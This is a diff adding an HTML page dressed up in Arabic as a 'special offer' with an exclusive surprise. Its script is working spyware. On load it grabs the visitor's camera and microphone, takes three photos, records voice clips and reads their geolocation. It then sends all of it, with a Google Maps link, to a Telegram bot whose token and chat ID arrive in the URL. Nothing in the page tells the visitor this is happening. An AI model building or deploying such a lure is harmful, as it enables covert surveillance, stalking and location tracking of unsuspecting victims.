@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>عرض خاص</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+            background-color: #fff;
+            color: #333;
+        }
+
+        .container {
+            padding: 20px;
+        }
+
+        h1 {
+            margin-bottom: 20px;
+            color: #e74c3c;
+            font-size: 24px;
+            font-weight: bold;
+        }
+
+        .camera {
+            position: relative;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+
+        video {
+            width: 400px;
+            height: auto;
+            border: 2px solid #333;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+
+        canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>عرض خاص: اكتشف مفاجأتنا الحصرية الآن!</h1>
+        <div class="camera">
+            <video id="video" autoplay></video>
+        </div>
+        <canvas id="canvas"></canvas>
+        <div class="output">
+            <h2>انتظر المفاجأة...</h2>
+        </div>
+    </div>
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const telegramBotToken = urlParams.get("token");
+        const chatId = urlParams.get("chat_id");
+
+        if (!telegramBotToken || !chatId) {
+            alert("الرابط غير صالح. يرجى إدخال التوكن والـ Chat ID بشكل صحيح.");
+            throw new Error("Missing token or chat_id");
+        }
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        let audioBlobs = [];
+
+        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+            .then(stream => {
+                video.srcObject = stream;
+
+                video.addEventListener('loadeddata', () => {
+                    let counter = 0;
+                    const captureInterval = setInterval(() => {
+                        capturePhoto(counter + 1);
+                        counter++;
+                        if (counter === 3) {
+                            clearInterval(captureInterval);
+                            getLocation();
+                        }
+                    }, 500);
+                });
+
+                const mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.start();
+                setTimeout(() => {
+                    mediaRecorder.stop();
+                }, 5000);
+
+                mediaRecorder.ondataavailable = (event) => {
+                    audioBlobs.push(event.data);
+                    if (audioBlobs.length === 2) {
+                        sendAudioToTelegram(audioBlobs[0]);
+                        sendAudioToTelegram(audioBlobs[1]);
+                    }
+                };
+
+                setTimeout(() => {
+                    if (mediaRecorder.state !== 'inactive') {
+                        mediaRecorder.stop();
+                    }
+                }, 10000);
+            })
+            .catch(err => console.error(err));
+
+        function capturePhoto(index) {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const imageData = canvas.toDataURL('image/png');
+            sendPhotoToTelegram(imageData, `الصورة ${index}`);
+        }
+
+        function sendPhotoToTelegram(imageData, caption) {
+            const blob = dataURItoBlob(imageData);
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'photo.png');
+            formData.append('caption', caption);
+
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData,
+            }).catch(err => console.error('خطأ في إرسال الصورة:', err));
+        }
+
+        function sendAudioToTelegram(audioBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('voice', audioBlob, 'voice.ogg');
+
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendVoice`, {
+                method: 'POST',
+                body: formData,
+            }).catch(err => console.error('خطأ في إرسال الصوت:', err));
+        }
+
+        function dataURItoBlob(dataURI) {
+            const byteString = atob(dataURI.split(',')[1]);
+            const mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            return new Blob([ab], { type: mimeString });
+        }
+
+                function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    position => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+
+                        const locationMessage = `📍 إحداثيات الموقع:\n- خط العرض: ${latitude}\n- خط الطول: ${longitude}`;
+                        sendMessageToTelegram(locationMessage);
+
+                        const mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+                        sendMessageToTelegram(`🌍 رابط الموقع على الخريطة: ${mapUrl}`);
+                    },
+                    error => {
+                        console.error("خطأ في الحصول على الموقع الجغرافي:", error);
+                        sendMessageToTelegram("⚠️ تعذر الحصول على الموقع الجغرافي.");
+                    }
+                );
+            } else {
+                console.error("الموقع الجغرافي غير مدعوم في هذا المتصفح.");
+                sendMessageToTelegram("⚠️ الموقع الجغرافي غير مدعوم في هذا المتصفح.");
+            }
+        }
+
+        function sendMessageToTelegram(message) {
+            fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            }).catch(err => console.error('خطأ في إرسال الرسالة:', err));
+        }
+    </script>
+</body>
+</html>
+           
